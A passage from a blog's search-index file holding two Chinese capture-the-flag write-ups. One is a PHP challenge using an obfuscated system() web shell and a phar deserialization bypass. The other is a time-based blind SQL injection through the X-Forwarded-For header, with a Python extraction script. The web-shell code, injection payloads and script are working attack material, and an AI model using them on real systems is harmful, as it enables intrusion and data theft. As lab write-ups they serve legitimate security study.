<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token string">"syste"</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token string">"m"</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">.</span><span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token variable">$d</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
<span class="token comment" spellcheck="true">//存储位置：./sandbox/479bfbc13b06e3588906f74bae9507c9/25a452927110e39a345a2511c57647f2.php</span></code></pre>
<p>记录存储位置</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201026112809109.png" srcset="/img/loading.gif" alt="image-20201026112809109"></p>
<p>上传phar文件，记录存储位置：./sandbox/479bfbc13b06e3588906f74bae9507c9/444a6fb20b7dbea9db85ca6b90f304cf.phar</p>
<p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201026105602172.png" srcset="/img/loading.gif" alt="image-20201026105602172"></p>
<p>用php://filter/resource=phar://绕过伪协议过滤触发反序列化，执行对.htaccess的操作。</p>
<pre><code>view.php?filename=444a6fb20b7dbea9db85ca6b90f304cf.phar&amp;filepath=php://filter/resource=phar://sandbox/479bfbc13b06e3588906f74bae9507c9/444a6fb20b7dbea9db85ca6b90f304cf.phar</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201026112509260.png" srcset="/img/loading.gif" alt="image-20201026112509260"></p>
<p>直接访问shell位置读取flag。</p>
<pre><code>/sandbox/479bfbc13b06e3588906f74bae9507c9/25a452927110e39a345a2511c57647f2.php?a=cat%20../../../../../../flag;</code></pre><p><img src="//dddwmr.github.io/2019/10/21/BUUCTFwp/C:%5Chexo%5Csource_posts%5CBUUCTFwp.assets%5Cimage-20201026111950025.png" srcset="/img/loading.gif" alt="image-20201026111950025"></p>
<p><strong>持续更新</strong></p>
]]></content>
      <categories>
        <category>ctfweb</category>
      </categories>
      <tags>
        <tag>BUUCTF</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>insert into</title>
    <url>/2019/08/24/insert%20into/</url>
    <content><![CDATA[<img src="/2019/08/24/insert%20into/1-01.png" srcset="/img/loading.gif" title="image">

<p>观察题目</p>
<img src="/2019/08/24/insert%20into/1-02.png" srcset="/img/loading.gif" title="image">

<p>可以看到注入点应该在http头的x-forwarded-for上</p>
<a id="more"></a>

<img src="/2019/08/24/insert%20into/1-03.png" srcset="/img/loading.gif" title="image">

<p>这里还把‘，’过滤了</p>
<img src="/2019/08/24/insert%20into/1-04.png" srcset="/img/loading.gif" title="image">

<p>因为把，过滤了 if是用不了<br>这里用select case when..then..else..end代替<br>substr也用不了 但是可以用 from 1 for 1代替<br>为了节约时间，可以先手工查字段长度<br>这里以database()做示范:</p>
<p><strong>x-forwarded-for:1’ and case when(length((select database()))&lt;6) then sleep(3) else 0 end and ‘a</strong></p>
<img src="/2019/08/24/insert%20into/1-05.png" srcset="/img/loading.gif" title="image">

<p>可以看到右下的时间，延时了证明条件成立，最后测出database（）的长度为5，其他数据长度也这样测出来。还是以database()为例，如果单个字符测具体字段：<br><strong>x-forwarded-for:1’ and case when(substr((select database()) from 1 for 1)=’w’) then sleep(3) else 0 end and ‘a</strong></p>
<img src="/2019/08/24/insert%20into/1-06.png" srcset="/img/loading.gif" title="image">

<p>当然转成ascii码用二分法更有效率<br>但为了更加方便 这里写一个脚本</p>
<pre class=" language-python"><code class="language-python"> !<span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>python

<span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span> coding<span class="token punctuation">:</span> UTF<span class="token number">-8</span> <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
mystring <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token comment" spellcheck="true">#所有字母和数字的集合</span>
url<span class="token operator">=</span><span class="token string">'http://123.206.87.240:8002/web15/'</span>
<span class="token comment" spellcheck="true">#查库名</span>
data <span class="token operator">=</span> <span class="token string">"127.0.0.1'+(select case when (substring((database()) from {0} for 1)='{1}') then sleep(5) else 1 end) and '1'='1"</span>  <span class="token comment" spellcheck="true">#这里的{0}对应的是后面所需要的format里的str[i](str应该是database()) 查出来是web15</span>
<span class="token comment" spellcheck="true">#查表名</span>
data <span class="token operator">=</span> <span class="token string">"1'+(case when (substring((select group_concat(table_name) from information_schema.tables where table_schema=database()) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1"</span><span class="token comment" spellcheck="true">#查出来时clineip和flag</span>
<span class="token comment" spellcheck="true">#查字段名</span>
data <span class="token operator">=</span> <span class="token string">"1'+(case when (substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and     table_name='flag') from {0} for 1)='{1}') then sleep(4) else 1 end) and '1"</span>
<span class="token comment" spellcheck="true">#查出来是 flag</span>
<span class="token comment" spellcheck="true">#查内容</span>
data<span class="token operator">=</span> <span class="token string">"1'+(case when(substring((select flag from flag) from {0} for 1)='{1}') then sleep(4) else 1 end) and '1 "</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#之前得到database()长度为5，但由于substr默认从1开始，所以range设置为1-6 (1,2,3,4,5) 如果不想查把长度设置大一点既可以</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> mystring<span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
          headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'x-forwarded-for'</span><span class="token punctuation">:</span>data<span class="token punctuation">.</span>format<span class="token punctuation">(</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#format格式化输出，把查到的str的每一字符依次赋到{0}里去</span>
          res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#一旦延时超过3s，继续向下执行代码</span>
        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ReadTimeout<span class="token punctuation">:</span><span class="token comment" spellcheck="true">#跳到这里执行，得到所求</span>
          flag <span class="token operator">+=</span> j
          <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
          <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'The final flag:'</span><span class="token operator">+</span>flag<span class="token punctuation">)</span></code></pre>
<p>由于延时不是很稳定 所以很容易出错 多试几次才能有正确答案flag{cdbf14c9551d5be5612f7bb5d2867853}<br>（最好每次只开一个运行 不然出错概率太大）</p>
]]></content>
      <categories>
        <category>ctfweb</category>
      </categories>
      <tags>
        <tag>bugku</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
</search>
